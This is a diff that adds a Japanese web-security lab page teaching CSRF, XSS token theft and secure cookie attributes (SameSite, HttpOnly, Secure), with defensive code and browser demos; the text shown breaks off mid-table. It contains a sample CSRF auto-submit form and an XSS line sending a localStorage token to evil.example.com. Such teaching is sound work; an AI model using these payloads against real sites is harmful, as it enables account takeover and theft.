@@ -1,0 +1,1398 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Auth Lab 03: セキュリティ実践</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;600&family=Noto+Sans+JP:wght@400;700&display=swap');
+
+  :root {
+    --bg: #ffffff;
+    --surface: #f5f7fa;
+    --surface2: #ebeef2;
+    --border: #c8cdd3;
+    --text: #1a1a2e;
+    --text-dim: #5c6370;
+    --accent: #005cc5;
+    --accent2: #22863a;
+    --accent3: #6f42c1;
+    --warn: #b08800;
+    --danger: #cb2431;
+    --code-bg: #f0f4f8;
+    --radius: 10px;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    font-family: 'Noto Sans JP', sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    line-height: 1.8;
+    padding: 2rem;
+    max-width: 1100px;
+    margin: 0 auto;
+  }
+
+  h1 {
+    font-size: 1.6rem;
+    color: var(--accent);
+    border-bottom: 2px solid var(--border);
+    padding-bottom: 0.8rem;
+    margin-bottom: 1.5rem;
+    font-family: 'IBM Plex Mono', monospace;
+  }
+
+  h2 {
+    font-size: 1.25rem;
+    color: var(--accent2);
+    margin: 2rem 0 1rem;
+    font-family: 'IBM Plex Mono', monospace;
+  }
+
+  h3 {
+    font-size: 1.05rem;
+    color: var(--accent3);
+    margin: 1.5rem 0 0.8rem;
+  }
+
+  p, li { font-size: 0.92rem; margin-bottom: 0.5rem; }
+
+  .status-bar {
+    display: flex;
+    gap: 1rem;
+    align-items: center;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: 0.6rem 1rem;
+    margin-bottom: 1.5rem;
+    font-size: 0.82rem;
+    font-family: 'IBM Plex Mono', monospace;
+    flex-wrap: wrap;
+  }
+  .status-item { display: flex; align-items: center; gap: 0.4rem; }
+
+  .lab-box {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: 1.5rem;
+    margin: 1.5rem 0;
+  }
+
+  .step {
+    background: var(--surface2);
+    border-left: 3px solid var(--accent2);
+    border-radius: 0 var(--radius) var(--radius) 0;
+    padding: 1rem 1.2rem;
+    margin: 1rem 0;
+  }
+  .step-num {
+    font-family: 'IBM Plex Mono', monospace;
+    color: var(--accent2);
+    font-weight: 600;
+    font-size: 0.8rem;
+    margin-bottom: 0.3rem;
+  }
+
+  code, pre {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 0.82rem;
+  }
+  code {
+    background: var(--code-bg);
+    padding: 0.15rem 0.4rem;
+    border-radius: 4px;
+    color: var(--accent);
+  }
+  pre {
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: 1rem;
+    overflow-x: auto;
+    margin: 0.8rem 0;
+    line-height: 1.6;
+    color: #24292e;
+  }
+  pre .comment  { color: #6a737d; }
+  pre .kw       { color: #d73a49; font-weight: 600; }
+  pre .str      { color: #032f62; }
+  pre .highlight { color: var(--warn); font-weight: 600; }
+  pre .good      { color: var(--accent2); font-weight: 600; }
+  pre .bad       { color: var(--danger); font-weight: 600; }
+
+  .result-area pre { min-height: 2.5rem; }
+  .placeholder {
+    color: var(--text-dim);
+    font-style: italic;
+    font-size: 0.8rem;
+  }
+
+  .note {
+    background: #e8f4fd;
+    border: 1px solid #b3d7f5;
+    border-radius: var(--radius);
+    padding: 0.8rem 1rem;
+    margin: 1rem 0;
+    font-size: 0.85rem;
+    color: #1a4a6e;
+  }
+  .note::before { content: "💡 "; }
+
+  .note-green {
+    background: #e8f5e9;
+    border: 1px solid #a5d6a7;
+    border-radius: var(--radius);
+    padding: 0.8rem 1rem;
+    margin: 1rem 0;
+    font-size: 0.85rem;
+    color: #1b5e20;
+  }
+
+  .warn-box {
+    background: #fff8e1;
+    border: 1px solid #ffe082;
+    border-radius: var(--radius);
+    padding: 0.8rem 1rem;
+    margin: 1rem 0;
+    font-size: 0.85rem;
+    color: var(--warn);
+  }
+  .warn-box::before { content: "⚠️ "; }
+
+  .danger-box {
+    background: #fef2f2;
+    border: 1px solid #f5c6cb;
+    border-radius: var(--radius);
+    padding: 0.8rem 1rem;
+    margin: 1rem 0;
+    font-size: 0.85rem;
+    color: var(--danger);
+  }
+  .danger-box::before { content: "🔴 "; }
+
+  .check-item {
+    background: var(--surface2);
+    border-radius: var(--radius);
+    padding: 0.6rem 1rem;
+    margin: 0.4rem 0;
+    display: flex;
+    align-items: center;
+    gap: 0.6rem;
+    font-size: 0.88rem;
+    transition: opacity 0.3s;
+  }
+  .check-item input[type="checkbox"] {
+    width: 18px; height: 18px;
+    accent-color: var(--accent);
+    flex-shrink: 0;
+  }
+  .check-item.checked { opacity: 0.55; }
+
+  .diagram {
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: 1.2rem;
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 0.78rem;
+    line-height: 1.5;
+    overflow-x: auto;
+    white-space: pre;
+    color: var(--text-dim);
+    margin: 1rem 0;
+  }
+
+  .two-col {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 1rem;
+    margin: 1rem 0;
+  }
+  @media (max-width: 768px) { .two-col { grid-template-columns: 1fr; } }
+
+  .col-card {
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: 0.8rem;
+    font-size: 0.8rem;
+  }
+  .col-card h4 {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 0.78rem;
+    margin-bottom: 0.5rem;
+    padding-bottom: 0.4rem;
+    border-bottom: 1px solid var(--border);
+  }
+
+  a { color: var(--accent2); text-decoration: none; }
+  a:hover { text-decoration: underline; }
+
+  hr { border: none; border-top: 1px solid var(--border); margin: 2.5rem 0; }
+
+  .toc {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: 1rem 1.2rem;
+    margin: 1rem 0 2rem;
+  }
+  .toc a {
+    display: inline-block;
+    padding: 0.25rem 0.6rem;
+    margin: 0.15rem;
+    border-radius: 6px;
+    font-size: 0.82rem;
+    background: var(--surface2);
+    transition: background 0.2s;
+  }
+  .toc a:hover { background: var(--border); text-decoration: none; }
+
+  html { scroll-behavior: smooth; }
+
+  .btn {
+    border: none;
+    padding: 0.5rem 1.2rem;
+    border-radius: 6px;
+    cursor: pointer;
+    font-weight: 600;
+    font-size: 0.85rem;
+    font-family: 'Noto Sans JP', sans-serif;
+    margin: 0.3rem;
+    transition: opacity 0.2s;
+  }
+  .btn:hover { opacity: 0.85; }
+  .btn:active { transform: scale(0.97); }
+  .btn:disabled { opacity: 0.4; cursor: not-allowed; }
+  .btn-accent  { background: var(--accent);  color: var(--bg); }
+  .btn-accent2 { background: var(--accent2); color: var(--bg); }
+  .btn-accent3 { background: var(--accent3); color: var(--bg); }
+  .btn-warn    { background: var(--warn);    color: var(--bg); }
+  .btn-danger  { background: var(--danger);  color: var(--bg); }
+  .btn-dim     { background: var(--surface2); color: var(--text-dim); border: 1px solid var(--border); }
+
+  .tag-good { background: #e8f5e9; color: #2e7d32; border-radius: 4px; padding: 0.1rem 0.5rem; font-size: 0.78rem; font-weight: bold; }
+  .tag-bad  { background: #fef2f2; color: var(--danger); border-radius: 4px; padding: 0.1rem 0.5rem; font-size: 0.78rem; font-weight: bold; }
+  .tag-warn { background: #fff8e1; color: var(--warn); border-radius: 4px; padding: 0.1rem 0.5rem; font-size: 0.78rem; font-weight: bold; }
+
+  .cookie-attr-table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 0.82rem;
+    margin: 0.8rem 0;
+  }
+  .cookie-attr-table th {
+    background: var(--surface2);
+    color: var(--accent3);
+    padding: 0.5rem 0.7rem;
+    border: 1px solid var(--border);
+    text-align: left;
+  }
+  .cookie-attr-table td {
+    padding: 0.45rem 0.7rem;
+    border: 1px solid var(--border);
+    vertical-align: top;
+  }
+  .cookie-attr-table tr:nth-child(even) { background: var(--surface); }
+
+  .compare-table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 0.82rem;
+    margin: 0.8rem 0;
+  }
+  .compare-table th {
+    background: var(--surface2);
+    color: var(--accent3);
+    padding: 0.5rem 0.7rem;
+    border: 1px solid var(--border);
+    text-align: left;
+  }
+  .compare-table td {
+    padding: 0.45rem 0.7rem;
+    border: 1px solid var(--border);
+    vertical-align: top;
+  }
+  .compare-table tr:nth-child(even) { background: var(--surface); }
+
+  .nav-lab {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: 0.8rem 1.2rem;
+    margin-top: 2.5rem;
+    font-size: 0.85rem;
+    flex-wrap: wrap;
+    gap: 0.5rem;
+  }
+
+  .note-textarea {
+    width: 100%;
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: 0.8rem;
+    font-family: 'Noto Sans JP', sans-serif;
+    font-size: 0.9rem;
+    resize: vertical;
+    min-height: 120px;
+    color: var(--text);
+  }
+  .save-indicator {
+    font-size: 0.78rem;
+    color: var(--accent2);
+    font-family: 'IBM Plex Mono', monospace;
+    margin-top: 0.3rem;
+    min-height: 1rem;
+  }
+</style>
+<script src="https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js"></script>
+<script>mermaid.initialize({ startOnLoad: true, theme: 'default', securityLevel: 'loose' });</script>
+</head>
+<body>
+
+<!-- ============================================ -->
+<!-- ヘッダー                                     -->
+<!-- ============================================ -->
+<h1>Auth Lab 03 — セキュリティ実践: CSRF / XSS / セキュアCookie</h1>
+<p style="font-size:0.72rem;color:var(--text-dim);margin-bottom:0.3rem;font-family:'IBM Plex Mono',monospace;">最終更新: 2026年4月</p>
+
+<div class="status-bar">
+  <div class="status-item">
+    <span style="font-weight:bold; color:var(--accent3);">★★★</span>
+    <span>難易度: 上級</span>
+  </div>
+  <div class="status-item">⏱ 目安時間: 30分</div>
+  <div class="status-item">📋 前提: Auth Lab 01 + Lab 02 完了</div>
+  <div class="status-item">🌐 環境: ブラウザのみ（DevTools必須）</div>
+</div>
+<p style="margin-bottom:0.5rem;font-size:0.82rem;"><a href="web-auth-index.html" style="color:var(--accent);text-decoration:none;">← マスター索引に戻る</a></p>
+
+<!-- ============================================ -->
+<!-- この章でわかること                           -->
+<!-- ============================================ -->
+<div class="lab-box" style="border-left:4px solid var(--accent);">
+  <h3>🎯 この Lab でわかること</h3>
+  <ul style="padding-left:1.4rem; margin-top:0.5rem;">
+    <li>CSRF 攻撃の仕組みと、<code>SameSite</code> Cookie が防御する原理</li>
+    <li>XSS が localStorage のトークンを盗む仕組みと HttpOnly Cookie による対策</li>
+    <li>セキュアな Cookie 設定（<code>__Host-</code> プレフィックス / <code>SameSite=Strict</code> / <code>Secure</code>）</li>
+    <li>アクセストークンのローテーションと最小権限設計</li>
+    <li>OutSystems での CSRF 対策・セキュア Cookie の確認方法</li>
+  </ul>
+</div>
+
+<div class="lab-box" style="border-color:var(--accent); margin-bottom:1rem;">
+  <h3 style="color:var(--accent); margin-top:0;">🎯 このLabの学習目標</h3>
+  <p style="margin-bottom:0.3rem;">完了すると、以下ができるようになります：</p>
+  <div class="check-item" style="opacity:1;"><span>1. CSRF攻撃の仕組みを説明し、CSRFトークンと SameSite Cookie での防御を実装できる</span></div>
+  <div class="check-item" style="opacity:1;"><span>2. XSS攻撃によるトークン窃取のリスクを理解し、HttpOnly Cookie の防御効果を体験できる</span></div>
+  <div class="check-item" style="opacity:1;"><span>3. Cookie属性（Secure, HttpOnly, SameSite, __Host-）の各役割を説明できる</span></div>
+  <div class="check-item" style="opacity:1;"><span>4. トークン管理のベストプラクティス（短寿命、最小権限、ローテーション）を適用できる</span></div>
+  <div class="check-item" style="opacity:1;"><span>5. 多層防御の考え方で認証セキュリティを設計できる</span></div>
+</div>
+
+<div class="warn-box" style="border-color:var(--accent3);background:#fce4ec;">
+  <strong style="color:var(--accent3);">💥 実務での失敗例</strong>：<code>SameSite</code> 未設定のセッションCookie + CSRFトークンなしで、攻撃者が別サイトからPOSTリクエストを送り、ユーザーの設定が無断で変更された
+</div>
+
+<p>
+  Auth Lab 01・02 で認証・認可の仕組みを学びました。
+  このLabでは「攻撃者の目線」から脆弱性を体験し、どのように防御するかを実践的に学びます。
+</p>
+
+<!-- ============================================ -->
+<!-- 目次                                         -->
+<!-- ============================================ -->
+<div class="toc">
+  <strong style="color:var(--text-dim);font-size:0.82rem;">目次:</strong><br>
+  <a href="#exp-auth3a">Auth3-A: CSRF攻撃デモ</a>
+  <a href="#exp-auth3b">Auth3-B: SameSite Cookie の防御効果</a>
+  <a href="#exp-auth3c">Auth3-C: XSS とトークン窃取</a>
+  <a href="#exp-auth3d">Auth3-D: セキュアCookie 設定</a>
+  <a href="#exp-auth3e">Auth3-E: トークン管理ベストプラクティス</a>
+  <a href="#exp-auth3f">Auth3-F: OutSystems セキュリティ確認</a>
+  <a href="#mistakes">よくある間違い</a>
+  <a href="#summary">まとめ</a>
+  <a href="#checklist">チェックリスト</a>
+  <a href="#note">学習ノート</a>
+  <a href="#framework">🔧 設定例</a>
+</div>
+
+<hr>
+
+<!-- ============================================ -->
+<!-- Auth3-A: CSRF攻撃デモ                        -->
+<!-- ============================================ -->
+<h2 id="exp-auth3a">Auth3-A: CSRF 攻撃の仕組みを理解する</h2>
+
+<div class="note-green">
+  <strong>🔰 初心者向け解説</strong><br>
+  <strong>利用シーン:</strong> Webアプリに「ログイン状態のままで悪意あるリクエストを実行させる」攻撃を学びます。<br>
+  <strong>なぜ重要？:</strong> セッション Cookie はブラウザが自動送信するため、ユーザーが気づかないまま意図しない操作（送金、パスワード変更など）を実行させることができます。<br>
+  <strong>身近な例え:</strong> 銀行に行くとき財布を自動で持っていくクセがある人に、「この封筒を銀行に持っていって」と頼む詐欺。財布（Cookie）は自動的についてきます。
+</div>
+
+<div class="lab-box" id="exp-auth3a">
+  <h3>CSRF 攻撃の流れ</h3>
+
+  <div class="diagram">CSRF 攻撃シーケンス
+
+  ユーザー          正規サービス              悪意あるサイト
+     │                   │                          │
+     │─── ログイン ───▶│                          │
+     │◀── Set-Cookie: session=abc123 ──────────────│
+     │                   │                          │
+     │  （ログイン状態で悪意あるサイトを閲覧）        │
+     │─────────────────────────────────────────▶  │
+     │◀── 自動ロードされる偽フォームのHTMLを返す ─── │
+     │                   │                          │
+     │  （ブラウザが自動でフォームをサブミット）       │
+     │─── POST /transfer?to=attacker&amount=10000 ──│
+     │    Cookie: session=abc123 ←自動付与！         │
+     │                   │                          │
+     │◀── 振込成功... ───│                          │
+
+  ポイント: ユーザーは「悪意あるサイトを見ただけ」なのに
+           セッションCookieが自動で正規サービスに送られる</div>
+
+  <h3>CSRF 攻撃サンプルコード（教育目的）</h3>
+  <p style="font-size:0.85rem; color:var(--text-dim);">
+    悪意あるサイトに仕込まれた典型的な CSRF 攻撃コードです。実際には実行しません。
+  </p>
+
+  <pre><span class="comment">// 悪意あるサイトのHTML（ページ読み込みと同時に実行）</span>
+<span class="comment">// この1行が被害者のブラウザにロードされると...</span>
+&lt;<span class="kw">img</span> src=<span class="str">"https://bank.example.com/transfer?to=attacker&amount=10000"</span>&gt;
+
+<span class="comment">// または自動サブミットするフォームとして:</span>
+&lt;<span class="kw">form</span> action=<span class="str">"https://bank.example.com/transfer"</span> method=<span class="str">"POST"</span> id=<span class="str">"csrf"</span>&gt;
+  &lt;<span class="kw">input</span> type=<span class="str">"hidden"</span> name=<span class="str">"to"</span> value=<span class="str">"attacker"</span>&gt;
+  &lt;<span class="kw">input</span> type=<span class="str">"hidden"</span> name=<span class="str">"amount"</span> value=<span class="str">"10000"</span>&gt;
+&lt;/<span class="kw">form</span>&gt;
+&lt;<span class="kw">script</span>&gt;document.getElementById(<span class="str">'csrf'</span>).submit();&lt;/<span class="kw">script</span>&gt;
+
+<span class="comment">// ブラウザはbank.example.comへのCookieを自動送信するため</span>
+<span class="comment">// セッションが有効なユーザーの認証が通ってしまう</span></pre>
+
+  <h3>CSRFトークンによる防御</h3>
+  <pre><span class="comment">// サーバー側: ログイン時にランダムなCSRFトークンを発行</span>
+<span class="kw">const</span> csrfToken = crypto.randomUUID(); <span class="comment">// 推測不可能な値</span>
+<span class="comment">// フォームに hidden field として埋め込む</span>
+<span class="comment">// &lt;input type="hidden" name="_csrf" value="a3f9b2..."&gt;</span>
+
+<span class="comment">// サーバー受信時: トークンが一致するか検証</span>
+<span class="kw">if</span> (req.body._csrf !== session.csrfToken) {
+  <span class="kw">return</span> res.status(403).json({ error: <span class="str">'CSRF token mismatch'</span> });
+}
+
+<span class="comment">// 攻撃者はCSRFトークンをHTMLから読み取れない（同一オリジンポリシー）</span>
+<span class="comment">// → 正しいトークンを持てず、リクエストは拒否される</span></pre>
+
+  <div class="step">
+    <div class="step-num">実習: ブラウザでCSRFトークンを確認する</div>
+    <p style="font-size:0.85rem; margin-top:0.5rem;">
+      1. 任意のWebサービスにログインして DevTools（F12）を開く<br>
+      2. <strong>Network タブ</strong> → フォーム送信時のリクエストを選択<br>
+      3. <strong>Payload タブ</strong>（または Request Body）を確認<br>
+      4. <code>_csrf</code> / <code>csrf_token</code> / <code>authenticity_token</code> などのフィールドを探す<br>
+      5. リロードのたびに値が変わることを確認（1回限り有効）
+    </p>
+  </div>
+</div>
+
+<hr>
+
+<!-- ============================================ -->
+<!-- Auth3-B: SameSite Cookie の防御効果          -->
+<!-- ============================================ -->
+<h2 id="exp-auth3b">Auth3-B: SameSite Cookie の防御効果を体験する</h2>
+
+<div class="lab-box">
+  <h3>SameSite 属性の 3つの値の違い</h3>
+
+  <table class="cookie-attr-table">
+    <thead>
+      <tr>
+        <th>値</th>
+        <th>クロスサイトリクエストでのCookie送信</th>
+        <th>CSRF 耐性</th>
+        <th>推奨度</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><code>SameSite=None</code></td>
+        <td>常に送信（<code>Secure</code>必須）</td>
+        <td><span class="tag-bad">なし</span></td>
+        <td><span class="tag-bad">非推奨（CSRF脆弱）</span></td>
+      </tr>
+      <tr>
+        <td><code>SameSite=Lax</code></td>
+        <td>トップレベルナビゲーション（GETリンクのみ）は送信</td>
+        <td><span class="tag-warn">部分的</span></td>
+        <td><span class="tag-warn">ブラウザのデフォルト値</span></td>
+      </tr>
+      <tr>
+        <td><code>SameSite=Strict</code></td>
+        <td>外部サイトからの遷移では一切送信しない</td>
+        <td><span class="tag-good">完全</span></td>
+        <td><span class="tag-good">推奨（セキュリティ優先）</span></td>
+      </tr>
+    </tbody>
+  </table>
+
+  <div class="note">
+    <strong>Lax と Strict の違いを具体例で理解する</strong><br>
+    メールに貼られたリンク（<code>https://bank.example.com/transfer</code>）をクリックした場合:<br>
+    • <strong>Lax</strong>: GETリクエストなのでCookieが送信される（ログイン状態が維持される）<br>
+    • <strong>Strict</strong>: 外部からの遷移なのでCookieは送信されない（ログイン画面にリダイレクト）<br><br>
+    <strong>Strict のデメリット:</strong> SNSシェアリンクや外部サービスからの遷移で毎回ログインが必要になる。
+    決済・管理画面は Strict、一般コンテンツは Lax というハイブリッド設計が現実的。
+  </div>
+
+  <h3>SameSite をコンソールでシミュレーション</h3>
+  <pre><span class="comment">// ブラウザコンソールで確認（DevTools → Application → Cookies）</span>
+<span class="comment">// このページに新しいCookieを設定してSameSite動作を確認する</span>
+
+<span class="comment">// ❌ 危険: SameSite未指定（古いブラウザではNone相当）</span>
+document.cookie = <span class="str">"session_bad=abc123; Path=/; Secure"</span>;
+
+<span class="comment">// ⚠️  標準: Lax（ブラウザのデフォルト、Chromeは未指定でLax扱い）</span>
+document.cookie = <span class="str">"session_lax=abc123; Path=/; Secure; SameSite=Lax"</span>;
+
+<span class="comment">// ✅ 推奨: Strict（クロスサイトリクエストで一切送信しない）</span>
+document.cookie = <span class="str">"session_strict=abc123; Path=/; Secure; SameSite=Strict"</span>;
+
+<span class="comment">// 設定後: DevTools → Application → Cookies で SameSite列を確認</span>
+console.log(<span class="str">"DevTools → Application → Cookies タブで設定を確認してください"</span>);</pre>
+
+  <div style="margin:1rem 0; text-align:center;">
+    <button class="btn btn-accent" onclick="demoSameSite()">SameSite デモ Cookie を設定する</button>
+    <button class="btn btn-dim" onclick="clearSameSite()">デモ Cookie を削除</button>
+  </div>
+  <div id="samesite-result" class="result-area">
+    <pre id="samesite-output" class="placeholder">▶ ボタンをクリックして Cookie を設定してください</pre>
+  </div>
+
+  <script>
+  function demoSameSite() {
+    const isSecure = location.protocol === 'https:';
+    const securePart = isSecure ? '; Secure' : '';
+    document.cookie = 'demo_samesite_lax=lax_value; Path=/' + securePart + '; SameSite=Lax';
+    document.cookie = 'demo_samesite_strict=strict_value; Path=/' + securePart + '; SameSite=Strict';
+    const msgs = [
+      '✅ SameSite=Lax Cookie を設定しました',
+      '✅ SameSite=Strict Cookie を設定しました',
+      '',
+      '確認方法: DevTools (F12) → Application → Cookies → ' + location.origin,
+      '  demo_samesite_lax    → SameSite: Lax',
+      '  demo_samesite_strict → SameSite: Strict',
+      '',
+      isSecure ? '(HTTPS環境: Secure属性も付与済み)' : '⚠ HTTP環境のためSecure属性なし（DevToolsで確認可）',
+    ];
+    document.getElementById('samesite-output').textContent = msgs.join('\n');
+    document.getElementById('samesite-output').className = '';
+  }
+
+  function clearSameSite() {
+    ['demo_samesite_lax', 'demo_samesite_strict'].forEach(name => {
+      document.cookie = name + '=; Path=/; Max-Age=0';
+    });
+    document.getElementById('samesite-output').textContent = '🗑 デモ Cookie を削除しました。DevTools で確認してください。';
+    document.getElementById('samesite-output').className = '';
+  }
+  </script>
+
+  <div class="warn-box">
+    <strong>HttpOnly Cookie は JavaScript から設定できません。</strong>
+    上のデモは document.cookie で設定できる通常の Cookie です。
+    実際の認証セッションは、サーバーが <code>Set-Cookie: session=xxx; HttpOnly; SameSite=Strict; Secure</code>
+    を返すことで設定します。
+  </div>
+</div>
+
+<hr>
+
+<!-- ============================================ -->
+<!-- Auth3-C: XSS とトークン窃取                  -->
+<!-- ============================================ -->
+<h2 id="exp-auth3c">Auth3-C: XSS とトークン窃取の仕組み</h2>
+
+<div class="note-green">
+  <strong>🔰 初心者向け解説</strong><br>
+  <strong>利用シーン:</strong> 認証トークンをどこに保存するかによって、XSS攻撃による被害範囲が大きく変わります。<br>
+  <strong>なぜ重要？:</strong> localStorage にトークンを保存すると、XSSで簡単に盗まれます。HttpOnly Cookie に保存すると JavaScript からアクセスできないため、XSS への耐性が格段に上がります。<br>
+  <strong>身近な例え:</strong> 財布を外のポケット（localStorage）と内ポケット（HttpOnly Cookie）に入れる違い。スリ（XSS）は外のポケットには届くが、内ポケットには手が届かない。
+</div>
+
+<div class="lab-box" id="exp-auth3c">
+  <h3>XSS によるトークン窃取シナリオ</h3>
+
+  <pre><span class="comment">// ===== 脆弱なコード例 =====</span>
+<span class="comment">// ログイン成功時にlocalStorageに保存（危険！）</span>
+<span class="bad">localStorage.setItem('auth_token', jwtToken);</span>
+
+<span class="comment">// 攻撃者が注入したXSSスクリプト（例: コメント欄からの注入）</span>
+<span class="bad">// &lt;script&gt;fetch('https://evil.example.com/steal?t='+localStorage.getItem('auth_token'))&lt;/script&gt;</span>
+
+<span class="comment">// 上記コードが実行されると、トークンが攻撃者サーバーに送信される</span>
+
+<span class="comment">// ===== 安全な実装 =====</span>
+<span class="comment">// サーバーが HttpOnly Cookie でトークンを管理</span>
+<span class="good">// Set-Cookie: access_token=eyJ...; HttpOnly; Secure; SameSite=Strict; Path=/api</span>
+
+<span class="comment">// JavaScriptからはアクセス不可能（document.cookieに表示されない）</span>
+<span class="good">document.cookie; // → HttpOnlyのCookieは含まれない</span>
+
+<span class="comment">// リクエスト時は自動的にブラウザが付与（コードは不要）</span>
+<span class="good">fetch('/api/user').then(r => r.json()); // Cookieは自動送信</span></pre>
+
+  <h3>トークン保存場所の XSS 耐性比較</h3>
+
+  <table class="compare-table">
+    <thead>
+      <tr>
+        <th>保存場所</th>
+        <th>XSS耐性</th>
+        <th>CSRF耐性</th>
+        <th>有効期限</th>
+        <th>推奨度</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><code>localStorage</code></td>
+        <td><span class="tag-bad">なし（JS から読み取り可）</span></td>
+        <td><span class="tag-good">高（自動送信なし）</span></td>
+        <td>永続</td>
+        <td><span class="tag-bad">非推奨</span></td>
+      </tr>
+      <tr>
+        <td><code>sessionStorage</code></td>
+        <td><span class="tag-bad">なし（JS から読み取り可）</span></td>
+        <td><span class="tag-good">高</span></td>
+        <td>タブ閉鎖で消える</td>
+        <td><span class="tag-warn">低リスクのみ許容</span></td>
+      </tr>
+      <tr>
+        <td><code>Cookie（通常）</code></td>
+        <td><span class="tag-warn">低（JS読み取り可）</span></td>
+        <td><span class="tag-bad">低（自動送信）</span></td>
+        <td>Max-Age で設定</td>
+        <td><span class="tag-bad">非推奨</span></td>
+      </tr>
+      <tr style="background:#e8f5e9;">
+        <td><strong><code>Cookie（HttpOnly）</code></strong></td>
+        <td><span class="tag-good">高（JS読み取り不可）</span></td>
+        <td><span class="tag-good">高（SameSite=Strict）</span></td>
+        <td>Max-Age で設定</td>
+        <td><span class="tag-good">推奨</span></td>
+      </tr>
+      <tr style="background:#e8f5e9;">
+        <td><strong>メモリ（変数）</strong></td>
+        <td><span class="tag-good">高（ページ遷移で消える）</span></td>
+        <td><span class="tag-good">高</span></td>
+        <td>ページ離脱で消える</td>
+        <td><span class="tag-good">アクセストークン向き</span></td>
+      </tr>
+    </tbody>
+  </table>
+
+  <h3>XSS 保護チェック — 実習</h3>
+  <div class="step">
+    <div class="step-num">localStorage への保存 vs HttpOnly Cookie の読み取り確認</div>
+    <p style="font-size:0.85rem; margin-top:0.5rem;">
+      以下のコードをブラウザコンソールに貼り付けて実行し、違いを確認します:
+    </p>
+  </div>
+  <pre><span class="comment">// ブラウザコンソール（F12）で実行してください</span>
+<span class="comment">// Step 1: localStorageにトークンを保存</span>
+localStorage.setItem(<span class="str">'test_token'</span>, <span class="str">'eyJhbGciOiJIUzI1NiJ9.PAYLOAD.SIGNATURE'</span>);
+console.log(<span class="str">'localStorage から読み取り:'</span>, localStorage.getItem(<span class="str">'test_token'</span>));
+<span class="comment">// → 読み取れてしまう（XSSで盗まれる）</span>
+
+<span class="comment">// Step 2: HttpOnly Cookie がJSで読み取れないことを確認</span>
+console.log(<span class="str">'document.cookie:'</span>, document.cookie);
+<span class="comment">// → HttpOnly属性の付いたCookieはここに表示されない</span>
+<span class="comment">// → DevTools(F12) → Application → Cookies でのみ確認可能</span>
+
+<span class="comment">// Step 3: 後始末</span>
+localStorage.removeItem(<span class="str">'test_token'</span>);</pre>
+
+  <div style="margin:1rem 0; text-align:center;">
+    <button class="btn btn-accent3" onclick="demoXSS()">XSS窃取シミュレーション</button>
+    <button class="btn btn-dim" onclick="clearXSS()">後始末</button>
+  </div>
+  <div id="xss-result" class="result-area">
+    <pre id="xss-output" class="placeholder">▶ ボタンをクリックして実行してください</pre>
+  </div>
+
+  <script>
+  function demoXSS() {
+    const fakeToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMTIzIiwicm9sZSI6ImFkbWluIn0.FAKE_SIGNATURE';
+    localStorage.setItem('vulnerable_token', fakeToken);
+
+    const stolen = localStorage.getItem('vulnerable_token');
+    const allCookies = document.cookie;
+    const hasHttpOnly = allCookies.includes('vulnerable_token');
+
+    const lines = [
+      '=== XSS窃取シミュレーション ===',
+      '',
+      '【localStorage（危険）】',
+      'localStorage.setItem("vulnerable_token", "eyJ...")  ← 保存',
+      '',
+      '攻撃者の悪意あるスクリプト実行結果:',
+      '  localStorage.getItem("vulnerable_token") = ',
+      '  ' + stolen.substring(0, 60) + '...',
+      '  → ✅ 読み取り成功！これがXSSで外部サーバーに送信される',
+      '',
+      '【HttpOnly Cookie（安全）】',
+      'document.cookie = "' + (allCookies.substring(0, 60) || '（通常Cookieなし）') + '"',
+      '  → HttpOnly属性のCookieはここには表示されない',
+      '  → JavaScriptでは読み取り不能（XSSに耐性あり）',
+      '',
+      '結論: 認証トークンは HttpOnly Cookie に保存すること！',
+    ];
+    document.getElementById('xss-output').textContent = lines.join('\n');
+    document.getElementById('xss-output').className = '';
+  }
+
+  function clearXSS() {
+    localStorage.removeItem('vulnerable_token');
+    document.getElementById('xss-output').textContent = '🗑 vulnerable_token を localStorage から削除しました。';
+    document.getElementById('xss-output').className = '';
+  }
+  </script>
+</div>
+
+<hr>
+
+<!-- ============================================ -->
+<!-- Auth3-D: セキュアCookie 設定                  -->
+<!-- ============================================ -->
+<h2 id="exp-auth3d">Auth3-D: セキュアな Cookie 設定を理解する</h2>
+
+<div class="lab-box">
+  <h3>Cookie セキュリティ属性一覧</h3>
+
+  <table class="cookie-attr-table">
+    <thead>
+      <tr>
+        <th>属性</th>
+        <th>役割</th>
+        <th>設定例</th>
+        <th>推奨</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><code>HttpOnly</code></td>
+        <td>JavaScriptからの読み取りを禁止（XSS対策）</td>
+        <td><code>HttpOnly</code></td>
+        <td><span class="tag-good">必須</span></td>
+      </tr>
+      <tr>
+        <td><code>Secure</code></td>
+        <td>HTTPS接続時のみ送信（盗聴対策）</td>
+        <td><code>Secure</code></td>
+        <td><span class="tag-good">必須</span></td>
+      </tr>
+      <tr>
+        <td><code>SameSite=Strict</code></td>
+        <td>クロスサイトリクエストで送信しない（CSRF対策）</td>
+        <td><code>SameSite=Strict</code></td>
